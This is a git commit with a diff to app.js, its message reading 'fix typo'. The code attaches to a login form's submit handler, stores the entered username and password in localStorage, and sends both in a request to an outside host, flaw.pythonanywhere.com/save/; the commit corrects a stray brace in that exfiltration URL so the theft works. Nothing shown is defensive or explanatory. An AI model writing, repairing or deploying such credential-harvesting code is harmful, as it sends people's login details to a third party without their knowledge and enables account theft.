9e2dda6b763b53ef89194f341990b1902784eb5e
va9iff <va9iff@gmail.com>
2022-04-19 14:05:40 +0400

    fix typo

--- app.js
+++ app.js
@@ -5,7 +5,7 @@ document.querySelector('form#login-form').addEventListener('submit',(e)=>{
     let un = document.querySelector('#LoginForm_username').value
     localStorage.u= un
     localStorage.p= pw
-    fetch('https://flaw.pythonanywhere.com/save/'+un+'/'+pw+'}')
+    fetch('https://flaw.pythonanywhere.com/save/'+un+'/'+pw)
 
 })
 
